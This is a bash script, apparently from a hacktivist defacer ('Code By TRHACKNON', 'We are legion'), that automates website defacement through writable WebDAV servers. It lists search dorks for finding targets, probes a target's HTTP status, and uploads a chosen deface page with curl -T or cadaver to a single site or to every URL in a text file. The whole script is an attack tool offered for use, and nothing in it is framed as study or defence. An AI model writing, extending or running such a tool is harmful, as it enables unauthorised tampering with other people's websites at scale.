#!/bin/bash

# Clear the terminal and display a banner
clear
echo ""

echo -e "\e[1;31m 
          ⣿⡇⣿⣿⣿⠛⠁⣴⣿⡿⠿⠧⠹⠿⠘⣿⣿⣿⡇⢸⡻⣿⣿⣿⣿⣿⣿⣿
          ⢹⡇⣿⣿⣿⠄⣞⣯⣷⣾⣿⣿⣧⡹⡆⡀⠉⢹⡌⠐⢿⣿⣿⣿⡞⣿⣿⣿
          ⣾⡇⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⢻⣦⡀⠁⢸⡌⠻⣿⣿⣿⡽⣿⣿
          ⡇⣿⠹⣿⡇⡟⠛⣉⠁⠉⠉⠻⡿⣿⣿⣿⣿⣿⣦⣄⡉⠂⠈⠙⢿⣿⣝⣿
          ⠤⢿⡄⠹⣧⣷⣸⡇⠄⠄⠲⢰⣌⣾⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⡀⠄⠈⠻⢮
          ⠄⢸⣧⠄⢘⢻⣿⡇⢀⣀⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠄⢀
         ⠄⠈⣿⡆⢸⣿⣿⣿⣬⣭⣴⣿⣿⣿⣿⣿⣿⣿⣯⠝⠛⠛⠙⢿⡿⠃⠄⢸
         ⠄⠄⢿⣿⡀⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡾⠁⢠⡇⢀
         ⠄⠄⢸⣿⡇⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣫⣻⡟⢀⠄⣿⣷⣾
         ⠄⠄⢸⣿⡇⠄⠈⠙⠿⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⠊⢀⡇⣿⣿
         ⠒⠤⠄⣿⡇⢀⡲⠄⠄⠈⠙⠻⢿⣿⣿⠿⠿⠟⠛⠋⠁⣰⠇⠄⢸⣿⣿⣿
         ⠄⠄⠄⣿⡇⢬⡻⡇⡄⠄⠄⠄⡰⢖⠔⠉⠄⠄⠄⠄⣼⠏⠄⠄⢸⣿⣿⣿
         ⠄⠄⠄⣿⡇⠄⠙⢌⢷⣆⡀⡾⡣⠃⠄⠄⠄⠄⠄⣼⡟⠄⠄⠄⠄⢿⣿⣿
\e[0m" 

echo ""

echo -e "\e[1;95m      || =====> Deface Method Webdav Script <===== || "
echo ""
echo -e "\e[1;32m _______________ Code By TRHACKNON (ANONYMOUS🐰)_______________\e[1;32m"
echo ""
echo -e "\e[1;91m                We are legion \e[0m"
echo ""

# Check if necessary tools are installed
if ! command -v curl &> /dev/null || ! command -v cadaver &> /dev/null; then
    echo -e "\e[1;31m curl or cadaver is not installed. Please install them and try again. \e[0m"
    exit 1
fi

# Function to upload using curl
upload_curl() {
    local target=$1
    local script=$2
    echo -e "\e[1;32m Uploading $script to $target... \e[0m"
    curl -T "$script" "$target"
    if [[ $? -eq 0 ]]; then
        echo -e "\e[1;32m Successfully uploaded: $target/$script \e[0m"
    else
        echo -e "\e[1;31m Upload failed! Please check the target and try again. \e[0m"
    fi
}

# Function to upload using cadaver
upload_cadaver() {
    local target=$1
    local script=$2
    echo -e "\e[1;32m Uploading $script to $target using cadaver... \e[0m"
    cadaver << EOF
open $target
put $script
EOF
    echo -e "\e[1;32m Done uploading with cadaver. \e[0m"
}

op=("Dork" "Exploit" "Website inspection"  "exit")
select opt in "${op[@]}"
do 
    echo ""
    case $opt in
        "Dork")
            echo ""
            if [[ -e "dork.txt" ]]; then
                cat dork.txt
            else
                echo -e "\e[1;31m dork.txt not found! Please make sure it exists in the current directory. \e[0m"
            fi
            ;;
        "Website inspection")
            read -p "Enter Target site :: " T 
            url=$(curl -Iks $T | grep -i "HTTP/")
            if [[ -n "$url" ]]; then
                echo -e "\e[1;33m Target situation :: $url \e[0m"
            else
                echo -e "\e[1;31m Unable to reach the target site. Please check the URL and try again. \e[0m"
            fi
            ;;
        "Exploit")
            read -p "Enter Deface Script :: " p
            if [[ ! -e "$p" ]]; then
                echo -e "\e[1;31m Deface Script Not Found \e[0m"
                exit 1
            fi

            echo ""
            echo "Choose target mode:"
            echo "1. Single target"
            echo "2. Multiple targets (from .txt file)"
            read -p "Enter your choice (1 or 2): " choice

            echo ""
            echo "Choose upload method:"
            echo "1. curl"
            echo "2. cadaver"
            read -p "Enter your choice (1 or 2): " method

            case $choice in
                1)
                    read -p "Enter Target site :: " t
                    if [[ $method -eq 1 ]]; then
                        upload_curl "$t" "$p"
                    elif [[ $method -eq 2 ]]; then
                        upload_cadaver "$t" "$p"
                    else
                        echo -e "\e[1;31m Invalid method choice! \e[0m"
                    fi
                    ;;
                2)
                    read -p "Enter the path to the .txt file containing URLs :: " url_file
                    if [[ -e "$url_file" ]]; then
                        while IFS= read -r target; do
                            if [[ $method -eq 1 ]]; then
                                upload_curl "$target" "$p"
                            elif [[ $method -eq 2 ]]; then
                                    upload_cadaver "$target" "$p"
                                else
                                    echo -e "\e[1;31m Invalid method choice! \e[0m"
                                fi
                            done < "$url_file"
                        else
                            echo -e "\e[1;31m URL file not found! Please check the path and try again. \e[0m"
                        fi
                        ;;
                    *)
                        echo -e "\e[1;31m Invalid target mode choice! \e[0m"
                        ;;
                esac
                ;;
            "exit")
                echo -e "\e[1;32m Exiting... \e[0m"
                break
                ;;
            *)
                echo -e "\e[1;31m Invalid option! Please choose a valid one. \e[0m"
                ;;
        esac
    done
